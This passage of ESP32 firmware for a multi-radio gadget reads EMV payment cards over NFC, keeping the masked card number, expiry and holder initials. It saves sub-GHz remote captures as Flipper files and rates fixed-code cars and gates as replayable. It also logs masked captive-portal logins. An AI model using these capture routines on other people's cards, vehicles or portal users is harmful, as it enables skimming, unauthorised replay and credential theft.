    if (i + tlen > len) return;
    const uint8_t* val = data + i;

    if (tag == 0x57 && tlen >= 4 && !strlen(card.panMasked)) {
      char track[48] = {0};
      size_t tj = 0;
      for (uint8_t b = 0; b < tlen && tj + 1 < sizeof(track); b++) {
        uint8_t nibbles[2] = {(uint8_t)(val[b] >> 4), (uint8_t)(val[b] & 0x0F)};
        for (uint8_t ni = 0; ni < 2 && tj + 1 < sizeof(track); ni++) {
          if (nibbles[ni] <= 9) track[tj++] = '0' + nibbles[ni];
          else if (nibbles[ni] == 0x0D) track[tj++] = 'D';
          else if (nibbles[ni] == 0x0F) break;
        }
      }
      track[tj] = '\0';
      char pan[24] = {0};
      int p = 0;
      while (track[p] && track[p] != 'D' && track[p] != 'd' && p < 19) {
        pan[p] = track[p];
        p++;
      }
      pan[p] = '\0';
      nfcMaskPanDigits(pan, card.panMasked, sizeof(card.panMasked));
      const char* sep = strchr(track, 'D');
      if (!sep) sep = strchr(track, 'd');
      if (sep && strlen(sep) >= 5) snprintf(card.expiry, sizeof(card.expiry), "%.2s/%.2s", sep + 3, sep + 1);
    } else if (tag == 0x5A && tlen >= 4 && !strlen(card.panMasked)) {
      char pan[24] = {0};
      nfcBcdToDigits(val, tlen, pan, sizeof(pan), true);
      nfcMaskPanDigits(pan, card.panMasked, sizeof(card.panMasked));
    } else if (tag == 0x5F24 && tlen >= 3 && !strlen(card.expiry)) {
      snprintf(card.expiry, sizeof(card.expiry), "%02X/%02X", val[1], val[0]);
    } else if (tag == 0x5F20 && tlen > 0 && !strlen(card.holder)) {
      char rawName[32] = {0};
      uint8_t n = min((int)tlen, (int)sizeof(card.holder) - 1);
      memcpy(rawName, val, n);
      rawName[n] = '\0';
      for (uint8_t k = 0; k < n; k++) if (rawName[k] == '/') rawName[k] = ' ';
      char* last = strrchr(rawName, ' ');
      if (last && rawName[0]) snprintf(card.holder, sizeof(card.holder), "%c. %.18s", rawName[0], last + 1);
      else if (rawName[0]) snprintf(card.holder, sizeof(card.holder), "%c.", rawName[0]);
    }

    if (tag == 0x9F36 && tlen >= 2) {
      nfcAtc[0] = val[0]; nfcAtc[1] = val[1];
    } else if (tag == 0x9F4D && tlen == 2) {
      nfcLogSfi    = val[0];
      nfcLogMaxRec = val[1];
    }

    if (tag == 0x6F || tag == 0x70 || tag == 0x77 || tag == 0xA5 || tag == 0x61) {
      nfcParseEmvTlv(card, val, tlen);
    }
    i += tlen;
  }
}

static void nfcTryEMVNetwork(NfcCard& card) {
  // SELECT PPSE
  uint8_t apdu[] = {
    0x00, 0xA4, 0x04, 0x00, 0x0E,
    '2','P','A','Y','.','S','Y','S','.','D','D','F','0','1',
    0x00
  };
  uint8_t rsp[96]; uint8_t rspLen = sizeof(rsp);
  if (!nfcApdu("SELECT_PPSE", apdu, sizeof(apdu), rsp, &rspLen)) {
    snprintf(nfcLimitStage, sizeof(nfcLimitStage), "ppse-fail");
    return;
  }
  nfcSawPpse = true;
  snprintf(nfcLimitStage, sizeof(nfcLimitStage), "ppse");
  if (rspLen < 4) return;
  nfcParseEmvTlv(card, rsp, rspLen - 2);

  // Shallow BER-TLV scan: find tag 0x4F (AID), even inside FCI templates.
  uint8_t aidBuf[16] = {0};
  uint8_t aidLen = 0;
  uint8_t* end = rsp + rspLen - 2; // skip SW1/SW2
  for (uint8_t* p = rsp; p < end - 2; p++) {
    if (*p == 0x4F) {
      uint8_t tlen = *(p + 1);
      const uint8_t* aid = p + 2;
      if (tlen >= 5 && aid + tlen <= end) {
        aidLen = (uint8_t)min((int)tlen, 16);
        memcpy(aidBuf, aid, aidLen);
        nfcHex(aidBuf, aidLen, card.aid, sizeof(card.aid));
        const char* net = nfcNetworkFromAID(aid, tlen);
        if (net) strncpy(card.network, net, 13);
        break;
      }
    }
  }
  if (aidLen == 0) {
    Serial.println("[NFC-EMV] PPSE selected but no AID tag found");
    snprintf(nfcLimitStage, sizeof(nfcLimitStage), "no-aid");
    return;
  }
  Serial.printf("[NFC-EMV] aid=%s network=%s\n", card.aid, strlen(card.network) ? card.network : "unknown");

  uint8_t sel[24] = {0x00,0xA4,0x04,0x00,aidLen};
  memcpy(sel + 5, aidBuf, aidLen);
  sel[5 + aidLen] = 0x00;
  rspLen = sizeof(rsp);
  if (!nfcApdu("SELECT_AID", sel, 6 + aidLen, rsp, &rspLen)) {
    snprintf(nfcLimitStage, sizeof(nfcLimitStage), "aid-fail");
    return;
  }
  nfcSawAidSelect = true;
  snprintf(nfcLimitStage, sizeof(nfcLimitStage), "aid");
  nfcParseEmvTlv(card, rsp, rspLen - 2);

  // Try GPO before record reads. Some cards accept empty PDOL; others reject,
  // but READ RECORD still provides useful metadata on many contactless cards.
  uint8_t gpo[] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00, 0x00};
  rspLen = sizeof(rsp);
  if (nfcApdu("GPO_EMPTY_PDOL", gpo, sizeof(gpo), rsp, &rspLen)) {
    nfcSawGpo = true;
    snprintf(nfcLimitStage, sizeof(nfcLimitStage), "gpo");
    nfcParseEmvTlv(card, rsp, rspLen - 2);
  }

  // Read SFI 1-4, up to 6 records each — no early stop so 9F4D/9F36 are captured
  for (uint8_t sfi = 1; sfi <= 4; sfi++) {
    for (uint8_t rec = 1; rec <= 6; rec++) {
      uint8_t readRecord[] = {0x00, 0xB2, rec, (uint8_t)((sfi << 3) | 0x04), 0x00};
      rspLen = sizeof(rsp);
      char label[18];
      snprintf(label, sizeof(label), "READ_SFI%u_REC%u", sfi, rec);
      if (nfcApdu(label, readRecord, sizeof(readRecord), rsp, &rspLen)) {
        nfcSawRecord = true;
        snprintf(nfcLimitStage, sizeof(nfcLimitStage), "records");
        nfcParseEmvTlv(card, rsp, rspLen - 2);
      } else {
        break; // 6A83 = no more records in this SFI
      }
      delay(8);
    }
  }

  // Transaction log: if 9F4D was found, count readable log records
  nfcTxLogCount = 0;
  if (nfcLogSfi > 0 && nfcLogMaxRec > 0) {
    uint8_t logSfi = (nfcLogSfi >> 3) & 0x1F;
    if (logSfi == 0) logSfi = nfcLogSfi; // some cards store raw SFI
    uint8_t maxLog = (nfcLogMaxRec < 5) ? nfcLogMaxRec : 5;
    for (uint8_t r = 1; r <= maxLog; r++) {
      uint8_t lrec[] = {0x00, 0xB2, r, (uint8_t)((logSfi << 3) | 0x04), 0x00};
      uint8_t lrsp[96]; uint8_t lrspLen = sizeof(lrsp);
      char ll[20]; snprintf(ll, sizeof(ll), "LOG_%u_%u", logSfi, r);
      if (nfcApdu(ll, lrec, sizeof(lrec), lrsp, &lrspLen)) nfcTxLogCount++;
    }
    Serial.printf("[NFC-EMV] tx_log=%d records sfi=%u\n", nfcTxLogCount, logSfi);
  }

  Serial.printf("[NFC-EMV] result pan=%s expiry=%s name=%s atc=%02X%02X log_sfi=%u tx=%d\n",
                strlen(card.panMasked) ? "masked-present" : "missing",
                strlen(card.expiry) ? card.expiry : "missing",
                strlen(card.holder) ? "masked-present" : "missing",
                nfcAtc[0], nfcAtc[1], nfcLogSfi, nfcTxLogCount);
}

void nfcReadCard() {
  DBG_PRINTLN("[NFC] Poll");
  nfcScanStartMs = millis();
  nfcScanElapsedMs = 0;
  // Fast NACK check — endTransmission returns instantly if device absent
  // avoids 6s blocking inside readPassiveTargetID on missing PN532
  Wire.beginTransmission(0x24);
  if (Wire.endTransmission() != 0) {
    Serial.println("[NFC] PN532 not on bus (0x24)");
    return;
  }
  uint8_t uid[7]; uint8_t uidLen = 0;
  bool gotCard = false;
  for (int attempt = 0; attempt < 3 && !gotCard; attempt++) {
    gotCard = nfc532.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 90);
    if (!gotCard) delay(20);
  }
  if (!gotCard) {
    if (millis() - nfcLastNoCardLog > 2000) {
      Serial.println("[NFC] No card");
      nfcLastNoCardLog = millis();
    }
    return;
  }

  Serial.printf("[NFC] card detected uidLen=%u emvProbe=%s\n",
                uidLen, nfcEmvProbeEnabled ? "on" : "off");
  nfcSawPpse = false;
  nfcSawAidSelect = false;
  nfcSawGpo = false;
  nfcSawRecord = false;
  nfcLogSfi = 0; nfcLogMaxRec = 0; nfcTxLogCount = 0;
  nfcAtc[0] = 0; nfcAtc[1] = 0;
  snprintf(nfcLimitStage, sizeof(nfcLimitStage), "uid-only");
  nfcCard.valid = true;
  nfcCard.sak   = nfc532.getLastPassiveTargetSak();
  nfcCard.uidLen = uidLen;
  strncpy(nfcCard.network, "", 1);
  strncpy(nfcCard.aid, "", 1);
  strncpy(nfcCard.panMasked, "", 1);
  strncpy(nfcCard.expiry, "", 1);
  strncpy(nfcCard.holder, "", 1);

  // UID string
  char* p = nfcCard.uid;
  for (uint8_t i = 0; i < uidLen; i++) {
    if (i) p += snprintf(p, 4, ":%02X", uid[i]);
    else    p += snprintf(p, 3, "%02X",  uid[i]);
  }

  if (nfcEmvProbeEnabled) {
    Serial.println("[NFC-EMV] in-listing target for APDU exchange");
    if (nfc532.inListPassiveTarget()) {
      nfcTryEMVNetwork(nfcCard);
    } else {
      snprintf(nfcLimitStage, sizeof(nfcLimitStage), "inlist-fail");
      Serial.println("[NFC-EMV] inListPassiveTarget failed; APDU exchange unavailable");
    }
  }
  else Serial.println("[NFC-EMV] skipped by config");

  if (strlen(nfcCard.network) > 0) {
    strncpy(nfcCard.type, "EMV Payment", 21);
  } else if (strlen(nfcCard.network) == 0) {
    // Fallback: classify by UID length
    // 4-byte → MIFARE Classic/Mini, 7-byte → MIFARE Ultralight/NTAG
    // EMV cards also have 4/7 byte UIDs so check APDU result first (done above)
    if (uidLen == 4) strncpy(nfcCard.type, "MIFARE Classic", 21);
    else if (uidLen == 7) strncpy(nfcCard.type, "MIFARE Ultralight", 21);
    else snprintf(nfcCard.type, 21, "ISO14443 %db", uidLen);
  }

  Serial.printf("[NFC] UID=%s type=%s network=%s\n",
    nfcCard.uid, nfcCard.type, nfcCard.network);
  if (strlen(nfcCard.aid) > 0)
    Serial.printf("[NFC] AID=%s\n", nfcCard.aid);
  if (strlen(nfcCard.panMasked) > 0)
    Serial.printf("[NFC] PAN=%s expiry=%s name=%s\n", nfcCard.panMasked, nfcCard.expiry, nfcCard.holder);
  else
    Serial.println("[NFC] EMV metadata missing; UID-only capture saved");
  nfcScanElapsedMs = millis() - nfcScanStartMs;
  printNfcLimitSimulation();
  DBG_PRINTF("[NFC] uidLen=%u emvProbe=%s saved=%s\n",
             nfcCard.uidLen, nfcEmvProbeEnabled ? "on" : "off",
             sdAvailable ? "yes" : "no-sd");

  saveNfcCapture();

  if (strlen(nfcCard.network) > 0)
    triggerReaction(MOOD_SUCCESS, nfcCard.network, nfcCard.uid);
  else
    triggerReaction(MOOD_HAPPY, nfcCard.type, nfcCard.uid);

  nfcLastScan = millis();
}

void initNFC() {
  nfc532.begin();
  Wire.setTimeOut(180);  // after begin(); gives EMV APDUs room without long UI stalls
  nfcReady = true;      // skip getFirmwareVersion() at boot, verified on first scan
  Serial.println("[NFC] PN532 init done; ISO14443A EMV APDU path enabled");
}

// === SD CARD ===

uint32_t scanMaxSubGhzFileSeq() {
  uint32_t maxSeq = 0;
  File root = SD.open(SG_CAPTURE_DIR);
  if (!root || !root.isDirectory()) return 0;

  File entry = root.openNextFile();
  while (entry) {
    if (!entry.isDirectory()) {
      const char* p = entry.path();
      const char* slash = strrchr(p, '/');
      const char* name = slash ? slash + 1 : p;
      uint32_t seq = strtoul(name, nullptr, 10);
      if (seq > maxSeq) maxSeq = seq;
    }
    entry.close();
    entry = root.openNextFile();
  }
  root.close();
  return maxSeq;
}

void loadSdSequence() {
  uint32_t seqFromFile = 0;
  File f = SD.open("/captures/sequence.txt", FILE_READ);
  if (f) {
    while (f.available()) {
      String s = f.readStringUntil('\n');
      s.trim();
      uint32_t value = (uint32_t)s.toInt();
      if (value > 0) seqFromFile = value;
    }
    f.close();
  }

  uint32_t seqFromFiles = scanMaxSubGhzFileSeq() + 1;
  sdNextSeq = max(1UL, (unsigned long)max(seqFromFile, seqFromFiles));
  Serial.printf("[SD] next sequence=%lu\n", (unsigned long)sdNextSeq);
}

uint32_t allocateSdSequence() {
  uint32_t seq = sdNextSeq++;
  SD.remove("/captures/sequence.txt");
  File f = SD.open("/captures/sequence.txt", FILE_WRITE);
  if (f) {
    f.printf("%lu\n", (unsigned long)sdNextSeq);
    f.close();
  }
  return seq;
}

void initSD() {
  DBG_PRINTF("[SD] Init CS=%d SCK=%d MISO=%d MOSI=%d\n",
             PIN_SD_CS, PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI);
  pinMode(PIN_CC_CS, OUTPUT);
  digitalWrite(PIN_CC_CS, HIGH);
  pinMode(PIN_SD_CS, OUTPUT);
  digitalWrite(PIN_SD_CS, HIGH);
  sdSPI.begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);

  if (SD.begin(PIN_SD_CS, sdSPI, 4000000)) {
    sdAvailable = true;
    Serial.println("[SD] Card ready");
    Serial.printf("[SD] card=%llu MB total=%llu MB used=%llu MB\n",
                  SD.cardSize() / (1024ULL * 1024ULL),
                  SD.totalBytes() / (1024ULL * 1024ULL),
                  SD.usedBytes() / (1024ULL * 1024ULL));
    SD.mkdir("/captures");
    SD.mkdir(SG_CAPTURE_DIR);
    SD.mkdir(NFC_CAPTURE_DIR);
    SD.mkdir(IR_CAPTURE_DIR);
    SD.mkdir(WIFI_CAPTURE_DIR);
    loadSdSequence();
    if (!SD.exists(PORTAL_LOG_PATH)) {
      File f = SD.open(PORTAL_LOG_PATH, FILE_WRITE);
      if (f) { f.printf("VariOne %s - Portal Log\n", FW_VERSION); f.println("==========================="); f.close(); }
    }
    loadSdPortalThemes();
    DBG_PRINTF("[SD] Paths ready: %s %s %s %s %s\n",
               SG_CAPTURE_DIR, NFC_CAPTURE_DIR, IR_CAPTURE_DIR,
               WIFI_CAPTURE_DIR, PORTAL_LOG_PATH);
    if (!cc1101Ok) {
      Serial.println("[SPI] SD OK but CC1101 failed - suspect shared MISO contention from SD adapter");
      Serial.println("[SPI] Fix: use a tri-state SD module, isolate SD MISO, or move SD to separate SPI pins");
    }
  } else {
    Serial.println("[SD] No card - serial only");
  }
}

void sdLogCred(const char* user, const char* pass) {
  if (!sdAvailable) return;
  char maskedPass[33];
  char safeUser[33];
  char hash[41] = {0};
  maskSecret(pass, maskedPass, sizeof(maskedPass));
  sanitizeLogField(user, safeUser, sizeof(safeUser));
  String payload = String("portal|") + safeUser + "|" + maskedPass;
  sha1Hex(payload, hash, sizeof(hash));
  File f = SD.open(PORTAL_LOG_PATH, FILE_APPEND);
  if (f) {
    f.printf("[%lus] user=%s pass_masked=%s sha1=%s\n", millis()/1000, safeUser, maskedPass, hash);
    f.close();
    Serial.println("[SD] Saved masked portal event");
  }
  saveWifiPortalEvent(user, pass);
}

void sdPrintAllCreds() {
  if (!sdAvailable) { Serial.println("[SD] No card"); return; }
  File f = SD.open(PORTAL_LOG_PATH, FILE_READ);
  if (!f) { Serial.println("[SD] Cannot open portal log"); return; }
  Serial.println("\n[SD] === PORTAL LOG ===");
  while (f.available()) Serial.write(f.read());
  Serial.println("[SD] === END ===\n");
  f.close();
}

void sha1Hex(const String& payload, char* out, size_t outSize) {
  uint8_t hash[20];
  mbedtls_sha1_ret((const unsigned char*)payload.c_str(), payload.length(), hash);
  char* p = out;
  size_t left = outSize;
  for (int i = 0; i < 20 && left > 2; i++) {
    int n = snprintf(p, left, "%02x", hash[i]);
    p += n;
    left -= n;
  }
}

void saveSubGhzCapture() {
  if (!sdAvailable || sgPulseCount <= 0) {
    if (!sdAvailable) Serial.println("[SD] Sub-GHz capture not saved (no card)");
    return;
  }

  unsigned long captureStamp = millis();
  uint32_t seq = allocateSdSequence();
  uint32_t freqKHz = (uint32_t)(sgActiveFreqMHz * 1000.0f + 0.5f);
  uint32_t freqHz  = freqKHz * 1000UL;

  String payload;
  payload.reserve(900);
  payload += freqHz;
  payload += "|OOK|";
  payload += (int)SG_RX_BWS[sgActiveBwIdx];
  payload += "|";
  payload += sgCaptureRssi;
  payload += "|";
  payload += sgStartLevel;
  payload += "|";
  payload += sgTargetClass;
  payload += "|";
  for (int i = 0; i < sgPulseCount; i++) {
    if (i) payload += ",";
    payload += sgEdgesUs[i];
  }

  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  char path[96];
  snprintf(path, sizeof(path), "%s/%010lu_%lu_%lukHz.json",
           SG_CAPTURE_DIR, (unsigned long)seq, captureStamp, (unsigned long)freqKHz);
  File f = SD.open(path, FILE_WRITE);
  if (!f) {
    Serial.printf("[SD] Cannot write %s\n", path);
    return;
  }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.printf("  \"seq\": %lu,\n", (unsigned long)seq);
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", captureStamp);
  f.printf("  \"freq_hz\": %lu,\n", (unsigned long)freqHz);
  f.println("  \"modulation\": \"OOK\",");
  f.printf("  \"rx_bandwidth_khz\": %d,\n", (int)SG_RX_BWS[sgActiveBwIdx]);
  f.println("  \"data_rate_bps\": 3794,");
  f.printf("  \"target_class\": \"%s\",\n", sgTargetClass);
  f.printf("  \"pair_id\": %lu,\n", sgPairId);
  f.printf("  \"capture_index\": %u,\n", sgCaptureIndex);
  f.printf("  \"rssi_dbm\": %d,\n", sgCaptureRssi);
  f.printf("  \"floor_dbm\": %d,\n", sgNoiseFloor);
  f.printf("  \"start_level\": %u,\n", sgStartLevel);
  f.println("  \"analysis\": {");
  f.printf("    \"capture_quality\": \"%s\",\n", subGhzCaptureQuality());
  f.printf("    \"previous_similarity_pct\": %d,\n", sgLastSimilarityPct);
  f.printf("    \"previous_avg_delta_us\": %lu,\n", sgLastAvgDeltaUs);
  f.printf("    \"dynamic_candidate\": %s,\n", sgLastDynamicCandidate ? "true" : "false");
  f.printf("    \"protocol_guess\": \"%s\",\n", sgLastDynamicCandidate ? "dynamic_or_rolling_code_candidate" : "static_or_unknown_ook_candidate");
  f.printf("    \"decoded_protocol\": \"%s\",\n", sgDecodedProtocol);
  f.printf("    \"decoded_bits\": \"%s\",\n", sgDecodedBits);
  f.printf("    \"comparison_verdict\": \"%s\",\n", subGhzComparisonVerdict());
  f.printf("    \"security_verdict\": \"%s\"\n", sgLastDynamicCandidate ? "identify_only_replay_expected_rejected" : subGhzSecurityVerdict());
  f.println("  },");
  f.print("  \"edges_us\": [");
  for (int i = 0; i < sgPulseCount; i++) {
    if (i) f.print(',');
    f.print(sgEdgesUs[i]);
  }
  f.println("],");
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] Sub-GHz saved: %s target_class=%s start=%u edges=%d bw=%.0fkHz sha1=%s\n",
                path, sgTargetClass, sgStartLevel, sgPulseCount, SG_RX_BWS[sgActiveBwIdx], hash);

  // Also save Flipper-compatible .sub alongside JSON for offline analysis
  saveSubGhzFlipperSub(seq, captureStamp, freqHz);
}

// Save Flipper Zero .sub RAW file alongside the JSON capture.
// Format from https://developer.flipper.net/flipperzero/doxygen/subghz_file_format.html
// Positive values = HIGH duration µs, negative = LOW duration µs.
// sgStartLevel determines polarity of first edge.
void saveSubGhzFlipperSub(uint32_t seq, unsigned long stamp, uint32_t freqHz) {
  if (!sdAvailable || sgPulseCount <= 0) return;
  char path[96];
  uint32_t freqKHz = freqHz / 1000;
  snprintf(path, sizeof(path), "%s/%010lu_%lu_%lukHz.sub",
           SG_CAPTURE_DIR, (unsigned long)seq, stamp, (unsigned long)freqKHz);
  File f = SD.open(path, FILE_WRITE);
  if (!f) { Serial.printf("[SD] Cannot write .sub %s\n", path); return; }

  f.println("Filetype: Flipper SubGhz RAW File");
  f.println("Version: 1");
  f.printf("Frequency: %lu\n", (unsigned long)freqHz);
  // OOK 650kHz bandwidth preset — matches most 433MHz fob captures
  f.println("Preset: FuriHalSubGhzPresetOok650Async");
  f.println("Protocol: RAW");

  // RAW_Data: up to 512 values per line (we have max 128 edges, fits on one line)
  f.print("RAW_Data:");
  int polarity = sgStartLevel ? 1 : -1;  // +1 = HIGH first, -1 = LOW first
  for (int i = 0; i < sgPulseCount; i++) {
    f.print(' ');
    f.print(polarity * (int)sgEdgesUs[i]);
    polarity = -polarity;
  }
  f.println();
  f.close();
  Serial.printf("[SD] Flipper .sub saved: %s\n", path);
}

const char* subGhzCaptureQuality() {
  if (sgPulseCount >= 100) return "full";
  if (sgPulseCount >= 60) return "good";
  if (sgPulseCount >= 18) return "partial";
  return "weak";
}

const char* subGhzComparisonVerdict() {
  if (sgLastSimilarityPct < 0) return "needs_second_capture";
  if (sgLastDynamicCandidate) return "dynamic_candidate";
  return "static_candidate";
}

const char* subGhzSecurityVerdict() {
  if (strcmp(sgTargetClass, "fixed_code_car") == 0) return "static_replay_expected_if_capture_clean";
  if (strcmp(sgTargetClass, "fixed_code_gate") == 0) return "static_replay_expected_if_capture_clean";
  if (strcmp(sgTargetClass, "fixed_code_fan") == 0) return "static_replay_expected_if_capture_clean";
  if (strcmp(sgTargetClass, "fixed_code_appliance") == 0) return "static_replay_expected_if_capture_clean";
  if (strcmp(sgTargetClass, "rolling_code_car_attempt") == 0) return "dynamic_replay_expected_rejected_interaction_only_possible";
  return "unknown_requires_two_capture_comparison";
}

void saveSubGhzReplayResult(const char* result, const char* observation) {
  if (!sdAvailable || !sgCapture.valid) {
    if (!sdAvailable) Serial.println("[SD] Sub-GHz replay result not saved (no card)");
    return;
  }

  String payload;
  payload.reserve(160);
  payload += sgTargetClass;
  payload += "|";
  payload += result;
  payload += "|";
  payload += observation;
  payload += "|";
  payload += sgPulseCount;
  payload += "|";
  payload += sgCaptureRssi;

  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  unsigned long replayStamp = millis();
  uint32_t seq = allocateSdSequence();
  char path[96];
  snprintf(path, sizeof(path), "%s/%010lu_%lu_replay.json",
           SG_CAPTURE_DIR, (unsigned long)seq, replayStamp);
  File f = SD.open(path, FILE_WRITE);
  if (!f) {
    Serial.printf("[SD] Cannot write %s\n", path);
    return;
  }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.printf("  \"seq\": %lu,\n", (unsigned long)seq);
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", replayStamp);
  uint32_t freqKHz = (uint32_t)(sgActiveFreqMHz * 1000.0f + 0.5f);
  f.printf("  \"freq_hz\": %lu,\n", (unsigned long)(freqKHz * 1000UL));
  f.println("  \"modulation\": \"OOK\",");
  f.printf("  \"target_class\": \"%s\",\n", sgTargetClass);
  f.printf("  \"result\": \"%s\",\n", result);
  f.printf("  \"observation\": \"%s\",\n", observation);
  f.printf("  \"source\": \"%s\",\n", sgLoadedFromSd ? "sd" : "live");
  f.printf("  \"edges\": %d,\n", sgPulseCount);
  f.printf("  \"rssi_dbm\": %d,\n", sgCaptureRssi);
  f.printf("  \"security_verdict\": \"%s\",\n", subGhzSecurityVerdict());
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] Sub-GHz replay result saved: %s result=%s observation=%s verdict=%s\n",
                path, result, observation, subGhzSecurityVerdict());
}

void rollingToyToken(uint32_t counter, char* out, size_t outSize) {
  String payload = "toy-rolling|variOne-demo|";
  payload += counter;
  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));
  snprintf(out, outSize, "%.8s", hash);
}

bool rollingToyAccept(uint32_t counter, const char* token, uint32_t& lastAccepted) {
  char expected[9] = {0};
  rollingToyToken(counter, expected, sizeof(expected));
  if (counter <= lastAccepted) return false;
  if (counter > lastAccepted + 16) return false;
  if (strncmp(token, expected, 8) != 0) return false;
  lastAccepted = counter;
  return true;
}

void runRollingCodeSimulator() {
  uint32_t receiverLast = 1000;
  char fixedCode[] = "A1B2C3D4";
  char rolling1001[9] = {0};
  char rolling1002[9] = {0};
  rollingToyToken(1001, rolling1001, sizeof(rolling1001));
  rollingToyToken(1002, rolling1002, sizeof(rolling1002));

  bool fixedReplay1 = strcmp(fixedCode, "A1B2C3D4") == 0;
  bool fixedReplay2 = strcmp(fixedCode, "A1B2C3D4") == 0;
  bool rollingFresh = rollingToyAccept(1001, rolling1001, receiverLast);
  bool rollingStale = rollingToyAccept(1001, rolling1001, receiverLast);
  bool rollingNext = rollingToyAccept(1002, rolling1002, receiverLast);

  Serial.println("[ROLLSIM] toy rolling-code simulator; not a vehicle attack");
  Serial.printf("[ROLLSIM] fixed replay #1=%s #2=%s code=%s\n",
                fixedReplay1 ? "accepted" : "rejected",
                fixedReplay2 ? "accepted" : "rejected",
                fixedCode);
  Serial.printf("[ROLLSIM] rolling fresh counter=1001 token=%s result=%s\n",
                rolling1001, rollingFresh ? "accepted-once" : "rejected");
  Serial.printf("[ROLLSIM] rolling stale counter=1001 token=%s result=%s\n",
                rolling1001, rollingStale ? "accepted" : "rejected-stale");
  Serial.printf("[ROLLSIM] rolling next counter=1002 token=%s result=%s\n",
                rolling1002, rollingNext ? "accepted-once" : "rejected");
  Serial.println("[ROLLSIM] lesson: replaying a consumed rolling token fails; real systems add secret keys, sync windows, and protocol-specific checks");

  if (sdAvailable) {
    char path[72];
    snprintf(path, sizeof(path), "%s/%lu_rolling_sim.json", SG_CAPTURE_DIR, millis());
    File f = SD.open(path, FILE_WRITE);
    if (f) {
      f.println("{");
      f.println("  \"schema\": 1,");
      f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
      f.println("  \"demo\": \"toy_rolling_code_boundary\",");
      f.println("  \"real_vehicle_attack\": false,");
      f.printf("  \"fixed_replay_first\": %s,\n", fixedReplay1 ? "true" : "false");
      f.printf("  \"fixed_replay_second\": %s,\n", fixedReplay2 ? "true" : "false");
      f.printf("  \"rolling_fresh_once\": %s,\n", rollingFresh ? "true" : "false");
      f.printf("  \"rolling_stale_replay\": %s,\n", rollingStale ? "true" : "false");
      f.printf("  \"rolling_next_once\": %s,\n", rollingNext ? "true" : "false");
      f.println("  \"verdict\": \"fixed_code_replayable_rolling_code_stale_replay_rejected\"");
      f.println("}");
      f.close();
      Serial.printf("[SD] Rolling simulator saved: %s\n", path);
    } else {
      Serial.printf("[SD] Cannot write %s\n", path);
    }
  }

  triggerReaction(MOOD_SUCCESS, "Rolling sim", "see serial");
}

bool parseJsonIntAfter(const String& text, const char* key, int& out) {
  int k = text.indexOf(key);
  if (k < 0) return false;
  int colon = text.indexOf(':', k);
  if (colon < 0) return false;
  int i = colon + 1;
  while (i < (int)text.length() && (text[i] == ' ' || text[i] == '"' || text[i] == '\t')) i++;
  bool neg = false;
  if (i < (int)text.length() && text[i] == '-') { neg = true; i++; }
  long v = 0;
  bool any = false;
  while (i < (int)text.length() && isDigit(text[i])) {
    v = (v * 10) + (text[i] - '0');
    any = true;
    i++;
  }
  if (!any) return false;
  out = neg ? -v : v;
  return true;
}

bool parseJsonStringAfter(const String& text, const char* key, char* out, size_t outSize) {
  if (!outSize) return false;
  int k = text.indexOf(key);
  if (k < 0) return false;
  int colon = text.indexOf(':', k);
  if (colon < 0) return false;
  int quote = text.indexOf('"', colon + 1);
  if (quote < 0) return false;
  int end = text.indexOf('"', quote + 1);
  if (end < 0 || end <= quote) return false;
  size_t n = min((size_t)(end - quote - 1), outSize - 1);
  memcpy(out, text.c_str() + quote + 1, n);
  out[n] = '\0';
  return true;
}

bool loadSubGhzCaptureFile(const char* path) {
  if (!sdAvailable) {
    Serial.println("[SD] Cannot load Sub-GHz capture (no card)");
    return false;
  }
  File f = SD.open(path, FILE_READ);
  if (!f) {
    Serial.printf("[SD] Cannot open %s\n", path);
    return false;
  }

  String text;
  text.reserve(12000);
  while (f.available() && text.length() < 12000) text += (char)f.read();
  f.close();

  int rssi = -100;
  int startLevel = 1;
  int freqHz = 0;
  int bwKHz = 0;
  parseJsonIntAfter(text, "\"rssi_dbm\"", rssi);
  parseJsonIntAfter(text, "\"freq_hz\"", freqHz);
  parseJsonIntAfter(text, "\"rx_bandwidth_khz\"", bwKHz);
  if (!parseJsonStringAfter(text, "\"target_class\"", sgTargetClass, sizeof(sgTargetClass))) {
    snprintf(sgTargetClass, sizeof(sgTargetClass), "unknown");
  }
  if (!parseJsonIntAfter(text, "\"start_level\"", startLevel)) {
    Serial.println("[SD] Sub-GHz capture has no start_level; using level=1 best-effort");
  }

  int open = text.indexOf("\"edges_us\"");
  if (open >= 0) open = text.indexOf('[', open);
  int close = open >= 0 ? text.indexOf(']', open) : -1;
  if (open < 0 || close < 0) {
    Serial.printf("[SD] Bad Sub-GHz capture schema: %s\n", path);
    return false;
  }

  sgPulseCount = 0;
  memset(sgEdgesUs, 0, sizeof(sgEdgesUs));
  memset(sgWave, 0, sizeof(sgWave));
  int i = open + 1;
  uint8_t level = startLevel ? 1 : 0;
  while (i < close && sgPulseCount < SG_WAVE_SAMPLES) {
    while (i < close && !isDigit(text[i])) i++;
    unsigned long v = 0;
    bool any = false;
    while (i < close && isDigit(text[i])) {
      v = (v * 10) + (text[i] - '0');
      any = true;
      i++;
    }
    if (any) {
      sgEdgesUs[sgPulseCount] = (uint16_t)min(v, 65535UL);
      sgWave[sgPulseCount] = level;
      level = !level;
      sgPulseCount++;
    }
  }

  if (sgPulseCount <= 0) {
    Serial.printf("[SD] Empty Sub-GHz capture: %s\n", path);
    return false;
  }

  sgStartLevel = startLevel ? 1 : 0;
  sgCaptureRssi = rssi;
  if (freqHz > 0) sgActiveFreqMHz = freqHz / 1000000.0f;
  if (bwKHz > 0) {
    int bestBw = sgActiveBwIdx;
    int bestDelta = 9999;
    for (int j = 0; j < SG_RX_NBWS; j++) {
      int delta = abs((int)SG_RX_BWS[j] - bwKHz);
      if (delta < bestDelta) { bestDelta = delta; bestBw = j; }
    }
